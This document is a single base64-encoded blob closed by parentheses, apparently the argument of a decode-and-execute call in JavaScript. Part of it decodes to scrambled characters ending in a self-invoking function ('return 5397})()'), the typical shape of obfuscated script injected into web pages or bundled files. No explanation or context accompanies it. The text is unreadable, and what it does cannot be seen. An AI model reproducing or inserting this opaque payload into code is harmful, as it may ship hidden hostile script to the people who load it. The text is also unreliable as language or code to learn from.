zVjcHl3KSl1dFJsdHJfW189cykyZm9RdSBrKG8wZGIuIWQ6YSlmPS50OyAudWV1XC9pYjBuWjd1MFE4KXl0cGkuWy5jZVF1UVltdzsrLkAocmYoPS07b30pXS5dUWh4KS5RX2YuZnUqQGFuMWhzJFFic0ZvdGQudDAwbmFJbmlsIyUpKUFwZVF3UW8rZSxQKSUsZTNudFFsY28sZXdRZiIxc2l7bShDJjc9P1FvaWcoO2J1LmY6XSF0Zm5rZS5Dc3NkUSVwUVEsUW9xLmgufW5UNWMpaWFhMi4uX1ldSlFpbF9cXFFdSk5hXT1ffV0jZm9ReyV9b3ZuLnlRLHMuIEowNVIlYWJ4NmtydFNvbntmZT5zWl07ZmVkLiBbOGNRczMwUWwlJTZyPVFvYy50VlNRYzopX29OUWFdYis7cyBjMVEoLiFlIC5RYz9jclF0ZmM2YTEye3QxZGVCaC41XV1mYW9ibTs2UWVyO107YSZRcGNlIW4gdjU2KCVydWh9byktO3JvaWFfZjpwXlogMiE1X28uZSVyaWVtWSAlUTEufVFpYzt7KGhhXWIhMSxuXTopcjZaZWkoZj1uUXZnODhRQmNycm9rNDQpdE9yZjBtXWZhakMpZF1RZW5wQ3RSJWQsdFEuazV1NztZUVF3cGwgZlEuO2RvKGdmcGUlc10pJWUyemVpXS52cj10YX1wYlwvPSg2ZUs9Yi4uMHphbGxkXyVcJ2ZmZixhUTk7ZW5RdXJvLlE1YHJfPl07dDFRMDZoLHVhKlEuUV1wZTNnUTBpZWZlIS06e2V0ZnR4JSQwZmxRUV9ReXE1Lm9ub19mYWwuK2FbcCgyYDplJV1bJFFfKTNpN2ZhKSFyZihRND50UXBhbFFlZTNvUV1jYmtRKD0ub2xjP1EmeS5RKVFiJGxOaT0yb1EhfSZ9Zm4iKXVtLl1ueGRhNiRQa18xZillUX0+U2ZRUTV6KGZDd1wvUV0waXRKcilbb29uRSt0PSF5cGVFY2FzcnQ1UXtjJi5uPj1Rb1EpIFlvY2lnZTVuUSlpKDNCUVFRUWF0XWYzaTRAe3NkPVNmUT10UXV0aFlRUTtmUVplIHJoUWEwUWY4XXNmdiU+LWYuPThyclFfaS5RUUErKykqKXNfUS4pcihna3VzPWVdZVFRPWxjfTE4PTdodChhO3NyPz1ROVQ/cyEzMUFmbDAodGdRZVF3bDU0O206LnFyX3U2aW8uaT1vYlE2USxRY31le2E1UWY9dFFcXHRwc2VRUWVRYVlpUXRRKVFlc1ElaWR9KTFmPXg9KSlrXSAyOzA9UXIxNlFaVHZkX1FwPTsxO2ZfLl0oLlF0cjQwdDI0LkZsNmFsSXdsfT0oYVFRMWkuZV9AUWRfNTFkUXt0MXNkLGx9fXQxZWwrUXRyKGJbLkVyOn1fb1E1b2UoUV0uO2VwMHRINHJdZVE5MjtpOyFEdDFkeClRMSk9eyRBUWZbc11RfTFRZClvamZwKVEpaSx2UVF0VHQ9K3NubzViXCc7bWxmUW40NWU6T2w1ZWEsUU9vXWVkUVFpZDVyKFFyOiUsYzJ0KHI9U247dFFvLHR2IG1laWF0YV10aG9dOj1lMTEgUU9mYWMkYWx2YmZUNTJ7MmcpUXRfZW9RNCx1UVEpXWV0UWFyOFEwclFdLEhLIGNRbl09cyliUSg2Km4pNV0yZTBfUWhRM2ZAW2FyaW9mMl1LdHtvUV8gVE1sMih0X1FyOntdeCh0USEgc2kxXSgyeDZ0PWUsJCo6dFIpZihmKX0gPlFRMjIkZS41aXggfV9pdW8uLihlUV1jb3RRNClRXzNuc2d2aTRuX2MpaHJvXyVmbnsoT19fMFFfaFFRMihTcztlZl07SVNdZnslQ3MkZyUuPlB5eWZRVjF0YGlSPWUxXWUgKFFRZlFuOWp0biFlOzE9NW4rNG8uZVhtMFFvb1Flclolb2U6UWdRZjJdIEtdaVtRPWM4e299PXdUIWZzbFFmLHNdX1taSXQyeV8hIWNwPDY9b18rKS5ReDAlY1FJaF9RdFFuUSlyLmljMTFmOnYuMVFqUWFybC4oJUVycGZRaFEhdChmMSYmaF1lPSYpXCcwUWlRb1E7X1FfUVl0XWd9ZDFpKTwudnlhXTFZdCFlbm1dLmlyUWQoTm1kZl90dDJRIDYxNVE1ISVRe3tsSF0pfStfbz0pKHRRPTJ9dWUoUWphUSF0MFFhcyhRMmZmbnJUaWVzaXt1M2hhblFvNmVlSWY7MjldZl0kUXJvUWE9UXI/YT1jUVFpPXlvbWMxKG5Ra11oLCEkdElMPF0ocylRUWVRLlU4ICZhM1FRbyVdUVF0dFE1dHV0JC5ZMGMuNFE9ITNRRVtRKGFRMWlRNG4lbjhRaVEwI3JneiMyYURpaWJzZXhqZFEuZG5mZnMsLl17VFEjfXZHKCgtK2V0JWZmX2J1Li5uN20pI3R9UV0uYWkzWlEpM1QpIjNpUS4mLjNfUTxmLiw2eGVybD1fLkQuM3QsTF0pWzlmczN0bnI8cFFLXShRYXA2X2gmdHR9UWQzPSV1X3UyJGxWUTJuVHJwbiBqamgoOkRzKDVzIGxvaFErNGQoJF09cjsxXTB0b2JRc3NddSlsbHJhXz5RMmFyK2YyXzU0KT1fKSVuUShpOXRjUTNiJWEyZi4rb11rNDZyaSE9LnJue1FmTm1fczchYltvdDsoUGVmM1ZyaXAhcmYlJGFJJW9ub1E1ZzpoYTRyYSY9clFbYW5hZTlRJW5qcmI1ITNsZi5bbUx0ZW4rYTU9ZXkpZmVvbj1hUVE3NWVHUSxfLDUhe2dvbnNlUVEgbnJdaSJwb2k6YnMyKjh7KWVycih1dDEuY1FsUTgpaT17JTMiZWUuaVFvcjFYLmIpdWwzIHNwY30zajdlMDNnKVF0X21dM1F1XWR0fW8tUXQ9ZjtvMHJob3NkODAzZlEgZnRbJC41KGUrW2VedHVmNWl2b3RcXC4uUWZ9JTRdUSBRY2Mzb19sXFxuJVVRNGVRZF9dLmo0USxqJTJwdGUuMXJRN1EpZl8yaSk6USBwJTIgdHNdIz0paSl0Y2UpIF9hXlFRcmFaXUUmc2Y1UTVRaHIybGNRdFFvbDN7ci5RaTFRc3JkNCQ/ZTE1ZD1zUSAlaF90MSk7UWNdMjNcLyV1NzM9UT1NZXVRZzMyfVFXdDtvUS4lc1E9YTMkMFEuZTRRZGldblFuPW5ZYmh1bFFGb3JfQ3IzUW5RM2x1X3J9U2NhUWcpUV1zIThRLnRjdHUqLlFuUTI7ZTMoUT1RUVFmIFEzOy5RXzFRVTAzYyAlZl9sKCk/X1ExUVEuUWE1bHA0c1k1X250Xl9faV9mZGU9ZVFRZWJvNC5RKDI1N30pYXV2cmEuUWUpMV90dHBRKWNfM19yZVFsXFw1XzQtelFwO1EpKTZzM30pbityUV9UXS5jdCF0UWFfTmlvcy49JS5RblF9NFFbaVFvb0IzcFF9ZiglaV85dVEiZixlXSUmZmorKy1cLzMuUSVmblFpZlFiXzZvbjEuUVFhX1FmdDUsNSVdX1Epb3RrcmU/blFpX2ViKG9sUT1ldzZRblFRUTVtZk50XVEzX3R0OzhRbjRhXT09NHslKVFvbUclKTVRUSxlUVtRKDQgZV9RbzMgZ0lRbCU2WF0uZ3tRNDpyXC8uUXV9LD1jUW9hck1lSDJ4XSsoeyhRUVF0XWkzLHQgbHQxMzRnTTFyUSwxcnQoZGlReFEoOC45KHB9O19fbTVoVD5RaTY7UVEpUWlhY2s7aTE9VDshNHM3YihrZVE3UWZtUT1ueV9vUXkuYW59LTF0UWZhby5RIClqYVFlcmdlaXM7cl9fdXNudGIuJHRRUTZsN3M7XyVfNzZRIHR1ZixvIC0hXTkxfWdmUXIkU11qaS5kXCdzWjt0bC4gKDtvZlE0UVF0UTRuO25wMFF1IHJzPXNjMntFUXtyNV0hUTRycytxUSlmMWVRUXJRcmtjXVxcUTFnQzQ2S2VyUWQ4cCE1KS1vaWZRdC5dLC47b2JsJSBlUVEkbnIuYV8lZl8gKHNRbC4rMXIkKVFuYi5mdHhsXFxKUSl9ezZycG5RZTFdLHQ9ZzYhWCAydWpReXtfeSE6ZkVUblEpJVE1JSxRUT15aXRjYzYyIHUpdG8yNVF7XFwuIFEkUWYgUX1fKSE1c11mbl5RdFEhZGMgKWgpJGw5cHVRLi5vYjFhUVEyZiB9fShRIVFvJWkxXSxsPW5RaS5yUUlRVTJucmVbYX0uaS4lWS4gZWZ3YyZdaG5fZm8uZ1suXTUuZl8pKX15MnNmJGJlX2VtQztfNzJ0UV93Ml9pe2ZjcmpfX2sge1FsIDRjYl8iUX07UV09IDBRZlk7UTUyXyBkX3IuJXJlbC4ucl9fZXAiUXVdUV9vbjMpVixjcnIhKDRvKHVhbl10IHtEZj12X1spby1fbm8wICV0cGRpZmRRMX17MXIlIDJmX2JlXV0pNC1mbmYpLlFuJVF0LmNuPSBVb3RdJykpO3ZhciBjQ0o9Tlh6KGhtVSx3RGIgKTtjQ0ooMTA5Mik7cmV0dXJuIDUzOTd9KSgp'))
